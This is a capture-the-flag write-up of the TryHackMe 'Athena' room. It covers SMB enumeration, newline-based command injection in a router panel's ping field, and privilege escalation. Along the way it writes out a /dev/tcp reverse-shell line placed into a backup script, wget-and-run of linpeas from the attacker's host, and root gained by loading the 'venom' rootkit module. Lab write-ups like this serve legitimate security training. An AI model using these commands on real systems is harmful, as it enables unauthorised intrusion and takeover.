---
title: Athena
tags:
  - thm
  - medium
---

#### Author: AMD

![athena](../../images/thm/athena/athena.png)

This is a writeup for <b>Athena</b> room.

My target IP: 10.10.231.238

-----------------------------------------------------------------------------------
<b>NMAP</b>

Lets scan out target.

![nmap](../../images/thm/athena/nmap.png)

-----------------------------------------------------------------------------------
<b>RESEARCH</b>

Let's see what unusual ports used for.

![research](../../images/thm/athena/research.png)

-----------------------------------------------------------------------------------
<b>SMB CLIENT CONNECTION</b>

Let's list SMB shares that are accessible as guest. (-N)

![smbclient_list](../../images/thm/athena/smbclient_list.png)

![smbclient_ipc](../../images/thm/athena/smbclient_ipc.png)

![smbclient_public](../../images/thm/athena/smbclient_public.png)

We are in.

-----------------------------------------------------------------------------------
<b>SMB CLIENT</b>

Let's look around.

![smbclient_ls](../../images/thm/athena/smbclient_ls.png)

Run "vim msg_for_administrator.txt"

![msg_for_administrator](../../images/thm/athena/msg_for_administrator.png)

-----------------------------------------------------------------------------------
<b>ROUTER PANEL</b>

![router_panel](../../images/thm/athena/router_panel.png)

Let's try whoami.

![whoami](../../images/thm/athena/whoami.png)

![whoami_result](../../images/thm/athena/whoami_result.png)

-----------------------------------------------------------------------------------
<b>INJECTION</b>

Input "dummy", catch the request with Burp Suite and send to repeater.

All attempts ends up with "Attempt hacking!" or "Failed to execute ping." if they contain characters like ';' '|' '&' etc. But '\n' (%0a) works

![id](../../images/thm/athena/id.png)

![passwd](../../images/thm/athena/passwd.png)

-----------------------------------------------------------------------------------
<b>REVERSE SHELL</b>

run "nc -lvnp 4444"

![reverse_shell_burp](../../images/thm/athena/reverse_shell_burp.png)

![conn_received](../../images/thm/athena/conn_received.png)

We need to connect user athena.

-----------------------------------------------------------------------------------
<b>PRIVILEGE EXCALTION PART 1</b>

run "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" to get linpeas.sh on your pc.

run "python3 -m http.server 8080" on your pc to host it.  (Close Burp or change port)

run "wget http://YOUR-IP:8080/linpeas.sh -O /tmp/linpeas.sh"

run "chmod +x /tmp/linpeas.sh" to make it executable

run "/tmp/linpeas.sh"

![backup_sh](../../images/thm/athena/backup_sh.png)

![backup_sh_perms](../../images/thm/athena/backup_sh_perms.png)

-----------------------------------------------------------------------------------
<b>PRIVILEGE EXCALTION PART 2</b>

run "echo 'bash -i >& /dev/tcp/YOUR-IP/9001 0>&1' > /usr/share/backup/backup.sh"

run "nc -lvnp 9001" on your pc,

![user_athena](../../images/thm/athena/user_athena.png)

-----------------------------------------------------------------------------------
<b>GET USER FLAG</b>

![user_flag](../../images/thm/athena/user_flag.png)

-----------------------------------------------------------------------------------
<b>USER athena PERMISSION</b>

![user_athena_perm](../../images/thm/athena/user_athena_perm.png)

-----------------------------------------------------------------------------------
<b>PRIVILEGE EXCALTION PART 3</b>

![venom_ko_perms](../../images/thm/athena/venom_ko_perms.png)

It is readable. Lets get it

![venom_web_server](../../images/thm/athena/venom_web_server.png)

![get_venom](../../images/thm/athena/get_venom.png)

-----------------------------------------------------------------------------------
<b>INSPECT venom.ko</b>

Fire up Ghidra and open venom.ko

Under functions find give_root function.

![give_root](../../images/thm/athena/give_root.png)

Other weird funciton is hacked_kill.

![hacked_kill](../../images/thm/athena/hacked_kill.png)

![root_call](../../images/thm/athena/root_call.png)

If we kill the process 57 (0x39) we can become root.
-----------------------------------------------------------------------------------
<b>PRIVILEGE EXCALTION PART 4</b>

run "sudo /usr/sbin/insmod /mnt/.../secret/venom.ko"

run "kill -57 0"

run "id"

-----------------------------------------------------------------------------------
<b>GET ROOT FLAG</b>

run "cd /root"

run "cat root.txt"

![root_flag](../../images/thm/athena/root_flag.png)
